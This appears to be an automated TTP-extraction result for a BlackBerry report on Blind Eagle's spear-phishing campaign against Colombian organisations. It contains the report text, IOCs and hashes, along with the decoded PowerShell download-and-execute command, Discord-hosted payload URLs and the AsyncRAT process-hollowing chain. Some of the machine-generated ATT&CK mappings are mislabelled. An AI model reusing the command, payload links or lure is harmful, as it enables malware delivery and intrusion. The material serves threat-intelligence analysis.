{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 21,
      "langchain_extractions": 2,
      "high_confidence_ttps": 1,
      "processing_time_ms": 26332.268
    },
    "extraction_results": [
      {
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "extracted_ttps": [
          {
            "ttp_id": "62c39b6f-13ca-4c4c-aff5-248f8fb99c08",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Execution",
            "attack_id": "T1204.001",
            "tactic": "Execution",
            "description": "Threat actor used .NET Assemblies injected in memory to execute malicious code",
            "confidence_score": 0.728,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.314,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".NET Assemblies",
              "memory injection"
            ],
            "tools": [
              "at",
              ".NET Assemblies",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "23a41002-3566-4552-a48c-5e948df3977a",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Persistence",
            "attack_id": "T1053.005",
            "tactic": "Persistence",
            "description": "Threat actor used malicious DLLs to maintain persistence on the target system",
            "confidence_score": 0.716,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "malicious DLLs"
            ],
            "tools": [
              "at",
              "DLLs",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8929a83e-253c-4e05-9876-a0f4976bfd89",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "Threat actor used PowerShell to execute malicious commands",
            "confidence_score": 0.703,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d19cea20-d8fe-4405-ac1e-2b7e008eac57",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Spearphishing Attachment",
            "attack_id": "T1566.001",
            "tactic": "Initial Access",
            "description": "Threat actor sent spear-phishing emails with PDF attachments to target key industries in Colombia",
            "confidence_score": 0.69,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.74,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "e4d2799f3001a531d15939b1898399b4",
              "fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554",
              "Fv3608799004720042L900483000P19878099700001537012.pdf",
              "correspondencia@ccb.org.co",
              "alfredo agudelo moreno agudelomorenoalfredo79@gmail.com",
              "cobrofactura09291@gmail.com"
            ],
            "tools": [
              "PDF",
              "at",
              ".NET Assemblies",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "Visual Basic Scripts",
              "Sc",
              "apt",
              "NET",
              "base64",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "99f9005b-fcf9-4cc2-ac4d-7e8a01b3df21",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "d7d1f07d-0a77-4a9c-9564-68748ec64e04",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "PowerShell",
            "attack_id": "T1086",
            "tactic": "Execution",
            "description": "Detected PowerShell activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "13fce22c-c586-4d8a-88b6-64d003b35e6e",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Defense Evasion",
            "attack_id": "T1218.009",
            "tactic": "Defense Evasion",
            "description": "Threat actor used URL phishing to evade detection",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "URL phishing",
              "dian.server.tl"
            ],
            "tools": [
              "URL phishing",
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "Sc",
              "apt",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5e5670ea-b3e1-4acf-ae63-0853023892c8",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Threat actor created or modified system processes to maintain persistence",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.268,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "system process"
            ],
            "tools": [
              "at",
              "system process",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "838d9af0-1b6b-483e-8756-7e3486c57af6",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "User Execution",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Threat actor used user execution to run malicious code",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "user execution"
            ],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "cmd",
              "ping",
              "powershell",
              "schtasks",
              "user execution"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "07c7153e-5d52-4994-bc7f-2246fd0cb77c",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "5bb30b32-ec10-458c-9fd4-30a8fedbec82",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Threat actor used cmd to execute malicious commands",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ed223d70-a172-477f-a2d2-5b9c6d98bfdb",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Scripting",
            "attack_id": "T1059.003",
            "tactic": "Execution",
            "description": "Threat actor used scripting to execute malicious code",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "scripting"
            ],
            "tools": [
              "at",
              "rar",
              "scripting",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b1633ea2-b32d-486a-bd3b-7c7ec4957134",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Scripting",
            "attack_id": "T1059.005",
            "tactic": "Execution",
            "description": "Threat actor used scripting to execute malicious code",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "scripting"
            ],
            "tools": [
              "at",
              "rar",
              "scripting",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "37050cc2-2204-47e0-9c8c-870169b9d539",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "edaa49f4-338e-4e1e-84a9-0277f6be6c8e",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "7d06ad88-10d7-48ef-9438-306f28ea2c83",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8c4cd654-c409-4bd7-b3b0-2da0720380c1",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "777bc657-f4c8-49cb-a91e-de40b7aaa907",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a219344b-802d-4623-a59e-e2e923443f5e",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "56aa6692-fe18-4de1-84e4-259f06e734a5",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Scheduled Task/Job",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "Detected Scheduled Task/Job activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "15b7af44-3cb0-4c29-99a7-bbce396f8b17",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 9 Blind Eagle Deploys Fake UUE Files and Fsociety to Target Colombia s Judiciary Financial  Public  and Law Enforcement Entities blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia Summary APT-C-36  also known as Blind Eagle  has been actively targeting organizations in Colombia and Ecuador since at least 2019. It relies on spear-phishing emails sent to specific and strategic companies to conduct its campaigns. On Feb. 20  the BlackBerry Research and Intelligence teamwitnessed a new campaign where the threat actor impersonated a Colombian government tax agency to target key industries in Colombia including health  financial  law enforcement  immigration  and an agency in charge of peace negotiation in the country. Based on the infector vector and payload deployment mechanism  we also uncovered campaigns targeting Ecuador  Chile  and Spain. Brief MITRE ATT CK Information Tactic Technique Initial AccessT1566.001 ExecutionT1204.001  T1204.002  T1059.005  T1059.001  T1059.003 PersistenceT1053.005  T1547.001 Defense EvasionT1218.009 Weaponization and Technical Overview Weapons PDF for lures  Visual Basic Scripts  .NET Assemblies injected in memory  Malicious DLLs  PowerShell Attack Vector Spear-phishing attachment with PDF Network InfrastructureDDNS DuckDNS  Discord  Web Applications Targets Entities in Colombia Technical Analysis Context APT-C-36 is a South American cyber espionage group that has been actively targeting Latin America-based entities over the last few years.Although most of its efforts have been focused on Colombia  according to research conducted by CheckPoint researchers  it has also carried outintrusions against Ecuador. The main targets of this group for the last few years have been those related to financial and governmental entities. The initial vector for infection is typically a PDF attachment sent by email. In the case we ll be examining in this report  the sender of thephishing email opted to use the Blind Carbon Copy (BCC) field instead of the To: field  most likely in an attempt to evade spam filters. Theyorchestrated their scam to correspondencia@ccb.org.co  which is the official email address listed on the Contact Us page of the BogotaChamber of Commerce website. Bogot\u00e1  of course  is the Capital of Colombia. The email s Subject line reads   Obligaciones pendientes - DIAN N.2023-6980070- 39898001  - in English  this means  outstandingobligations   a lure craftily designed to catch the attention of unsuspecting law-abiding recipients. DIAN is Colombia s Directorate of NationalTaxes and Customs - the Direcci\u00f3n de Impuestos y Aduanas Nacionales. 2 / 1 9 The letter we analyzed states that the recipient is  45 days in arrears  with a tax payment  and tells the target to click a link to view theirinvoice  which comes in the form of a password-protected PDF. The letter was signed by a (likely fictious)  Roberto Mendoza Ortiz Department Head.  The phishing email s sender is  alfredo agudelo moreno agudelomorenoalfredo79[at]gmail[.]com   an email address whichalso appears to have been be made up specifically for this campaign. We also found another email address associated with this campaign   cobrofactura09291[at]gmail[.]com. The PDF attached to the phishing email tries to trick the recipient with logos and messages related to the Directorate of National Taxes andCustoms. APT-C-36 has regularly used DIAN in their spear-phishing lures over the years  presumably hoping that their targets  wish tomaintain in good standing with the tax authorities would override any natural caution they may have when opening emails sent from anunfamiliar email address. The PDF contains a URL different from the legitimate hyperlink to DIAN s website  which is https://www.dian.gov.co/. The URL shown is thereal one  however  if the user clicks on it  they are redirected to a different website. Finally  the URL field of this new site contains a URL whichdownloads a second-stage payload from the public service Discord. Below is the full intrusion attempt shown step-by-step: Figure 1: Attack flow of Blind Eagle s campaign analyzed Attack Vector Hashes (md5  sha-256)e4d2799f3001a531d15939b1898399b4 fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554 File name Fv3608799004720042L900483000P19878099700001537012.pdf File Size 507436 bytes Created 2023:01:25 10:07:03-05:00 Author Direcci\u00f3n De Aduanas Nacionales Calle 23   157-25 la Last Modified2023:01:25 10:07:03-05:00 3 / 1 9 DocumentIDuuid:9585FD65-6D08-453D-9E4A-51155AD12748 What is the DIAN  The Directorate of National Taxes and Customs is an entity attached to the Ministry of Finance and Public Credit. The DIAN is organized as aSpecial Administrative Unit of the national order. Its purpose is to help guarantee the fiscal security of the Colombian State and the protectionof the national economic public order through the administration and control of due compliance with tax  customs  and exchange obligations.The jurisdiction of the DIAN includes the national territory. It is headquartered in Bogot\u00e1  the Capital of Colombia. Weaponization Blind Eagle carefully targets its victims with spear-phishing emails  in a similar fashion to other campaigns by the group. It entices its targets toclick links contained in the body of the email  or to download a malicious PDF file  which purports to contain information about overdue taxes. The URL shown on the bait document masquerades as the actual domain of DIAN. However  when clicked  the hyperlink leads to anotherdomain created entirely by the threat actor using the public service website[.]org. The link redirects the target to dian.server[.]tl. This craftytechnique is known as URL phishing. 4 / 1 9 Figure 2: Content of the bait email  masquerading as the Directorate of National Taxes and Customs In English  the bait document reads: 5 / 1 9 Dear taxpayer  At DIAN we maintain our commitment to provide you with the necessary assistance and services so that you can comply in a timely andcorrect manner with your tax obligations. For this reason  we remind you that you are in arrears with your obligations. for an amount owed of THREE MILLION TWO HUNDREDFIFTY-TWO THOUSAND ONE HUNDRED FORTY PESOS  with 45 days in arrears due to the lack of commitment in your financialobligations regulated in law 0248 of the year 2005 numeral 12. Next  we put at your disposal the Virtual PDF with all the details of your obligations generated to date. Submit a foreclosure process and pay on time. In the following link you will find the invoice in PDF format. To view the document  enter the password: A2023 Cordially  ROBERTO MENDOZA ORTIZ Department Head When the victim clicks on the masked link in the email  they are redirected to dian.server[.]tl. The threat actor carefully crafted this webpage todeceive the victim into believing they are interacting with the real DIAN. Figure 3: Content presented to the user on the fake webpage dian.server[.]tl Looking at the code of the webpage  the content presented to the users is loaded from website[.]org/s8Xwt2 or website[.]org/render/s8Xwt2 and not from dian.server[.]tl. This is accomplished by using an iframe resized to the 100  of the screen. 6 / 1 9 Figure 4: The content the victim sees is shown on the left  which is loaded from the resource shown on the right The fake DIAN website page contains a button that encourages the victim to download a PDF to view what the site claims to be pending taxinvoices. Clicking the blue button initiates the download of a malicious file from the Discord content delivery network (CDN)  which theattackers are abusing in this phishing scam. hxxps://cdn.discordapp[.]com/attachments/1067819339090243727/1071063499494666240/Asuntos_DIAN_N34000137L287004P0889903-02-2023-pdf[.]uuehxxps://cdn.discordapp[.]com/attachments/1066009888083431506/1070342535702130759/Asuntos_DIAN_N6440005403992837L208801-02-2023-pdf[.]uuehxxps://cdn.discordapp[.]com/attachments/1072851594812600351/1072851643583967272/Asuntos_DIAN_N3663000227L2870000002408-02-2023-pdf[.]uue The downloaded file tries to trick the user into manually adding the word  pdf  at the end of the filename. However  the real extension isactually  uue.  This is a file extension WinRAR opens by default. Behind the extension there is a .RAR archive. Figure 5: Default installation of WinRAR with uue extension Hashes (md5  sha-256)B432202CF7F00B4A4CBE377C284F3F28 6D9D0EB5E8E69FFE9914C63676D293DA1B7D3B7B9F3D2C8035ABE0A3DE8B9FCA 7 / 1 9 File Name Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf.uue File Size 1941 (bytes) It s necessary to decompress the contents of the .uue file to continue with the infection chain. The compressed .uue file contains yet another fileinside it. The inner file uses the same naming convention as the parent  but in this case  the new file is a Visual Basic Script (VBS). Figure 6: Content of the malicious .uue file Hashes (md5  sha-256)6BEF68F58AFCFDD93943AFCC894F8740 430BE2A37BAC2173CF47CA1376126A3E78A94904DBC5F304576D87F5A17ED366 File name Asuntos_DIAN_N 6440005403992837L2088970004-01-02-2023-pdf.vbs File Size 227378 (bytes) Last Modified2023:01:31 23:01:04 The file-extracted VBS script is executed via wscript.exe once the user double-clicks the file  so an element of user-interaction is involved inexecuting the attack. Upon execution  the infection chain starts automatically and carries out various actions within the system without anyfurther user input  as seen below in figure 7. Figure 7: Process tree once the VBS script is manually executed by the user The VBS script s content is encoded but easy for a researcher to understand and decode. 8 / 1 9 Figure 8: Content of the VBS script The VBS script contains a significant amount of junk code  but has several replace functions to construct the PowerShell execution. Figure 9: Replace functions to replace junk code by the original behavior The content was built under the variable  OXVTEUOWQPEFWQ   as shown in figure 9 above. After creating that content  figure 8 shows thevariable  YISMXXAPAUXCGFI   which is set as a WScript object. After decoding the code  to better understand its behavior  we can see that a part of the logic - the URL shown in the above image - is actuallyreversed. 9 / 1 9 Figure 10: Part of the VBS code decoded Figure 11: A closer look at part of the VBS code  decoded The final payload executed is powershell.exe  with the following command line parameters:  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  [Byte[]] $rOWg   [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString( hxxp://172.174.176[.]153/dll/Dll.ppam )) [System.AppDomain]::CurrentDomain.Load($rOWg).GetType( Fiber.Home ).GetMethod( VAI ).Invoke($null  [object[]]( txt.ysa/3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc//:sptth )) First  PowerShell downloads and executes the decoded base64 content of hxxp://172.174.176[.]153/dll/Dll.ppam  which is a .NET DLLencoded  as shown in figure 12. 1 0 / 1 9 Figure 12: Base64 content from the server  called using powershell.exe Next  it uses GetType( Fiber.home ).GetMethod( VAI )  to load the VAI method from the DLL downloaded previously. The logic of this methodis as follows: To create a copy of the Visual Basic Script called  Asuntos_DIAN_N 6440005403992837L2088970004-01-02-2023-pdf.vbs  inC:\\Windows\\Temp\\OneDrive.vbs if it already doesn t exist using PowerShell.Powershell.exe -WindowStyle Hidden Copy-Item -Path  .vbs -Destination C:\\Windows\\Temp\\OneDrive.vbsDownload the content of hxxp://172.174.176[.]153/rump/Rump.xls (Fsociety)Replace characters of the content downloadedReverse the text of the second URL in the PowerShell command and download its content(hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)Create a string with the content  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe Load the Fsociety DLL into memory  passing two parameters:RegSvcs pathAsyncRAT payloadFsociety DLL loads AsyncRAT in the RegSvcs process using the Process Hollowing technique To better understand the PowerShell execution  the following image demonstrates the sequence of loading DLLs dynamically in memory untilthe final goal  which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on thethreat landscape today. 1 1 / 1 9 Figure 13: Sequence of loaded DLLs after PowerShell execution The following image is part of all the behavior described above  related to the first DLL loaded using the PowerShell command spawned by theVBS Script and calling the  VAI  method. 1 2 / 1 9 Figure 14: Part of the method VAI previously called by PowerShell As mentioned  Fsociety.dll is used to load the final payload of AsyncRAT  which is downloaded from Discord. Blind Eagle mainly uses AsyncRAT  njRAT  QuasarRAT  LimeRAT  and RemcosRAT in its campaigns. A RAT is a remote access tool a networkadmin may use to remotely administrate the node. So a malicious RAT installed on a victim s machine enables the threat actor to connect to theinfected endpoint any time they like  and to perform any operations they desire. Figure 15: Fsociety.dll is used to load AsyncRAT in memory The  Ande  function called in the Fsociety.dll contains the following code: 1 3 / 1 9 Figure 16: Fsociety DLL code Hashes (md5  sha-256)C75F9D3DA98E57B973077FDE8EC3780F 5399BF1F18AFCC125007D127493082005421C5DDEBC34697313D62D8BC88DAEC File Name Fiber.dll (Dll.ppam) File Size 10240 bytes Compiled Thu Feb 02 21:43:24 2023   UTC 1 4 / 1 9 Hashes (md5  sha-256)07AF8778DE9F2BC53899AAC7AD671A72 03B7D19202F596FE4DC556B7DA818F0F76195912E29D728B14863DDA7B91D9B5 File Name Fsociety.dll (Rump.xls) File Size 25600 bytes Compiled Sat May 18 00:13:09 2086   UTC Hashes (md5  sha-256)5E518B80C701E17259F3E7323EFFC83F 64A08714BD5D04DA6E2476A46EA620E3F7D2C8A438EDA8110C3F1917D63DFCFC File Name Stub.exe (AsyncRAT 